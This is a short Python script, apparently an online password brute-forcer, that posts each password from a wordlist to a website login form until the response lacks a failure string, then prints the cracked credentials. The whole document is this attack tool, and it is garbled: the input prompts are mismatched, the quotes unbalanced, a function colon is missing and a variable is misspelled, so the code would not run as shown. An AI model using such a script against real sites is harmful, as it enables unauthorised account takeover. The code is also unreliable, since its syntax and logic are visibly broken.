import requests

url = input('[+]' Enter Username For the Account to Bruteforce: '')
username = input('[+] Enter Password File to Use: ')
password_file = input('[+] Enter Password File to Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')

def cracking(username, url)
        for password in passwords:
                password = password.strip()
                print('Trying: ' + password)
                data = {'username':username,'password':password,'Login':'submit''}
                response = requests.post(url, data=data)
                if lognin_failed_string in response.content.decode():
                    pass
                else:
                    print('[+] Found Username: ==> ' + username)
                    print('[+] Found Password: ' ==> + password)
                    exit()


with open(password_file, 'r') as passwords:
    cracking(username, url)

print('[!!] Password Not in List')
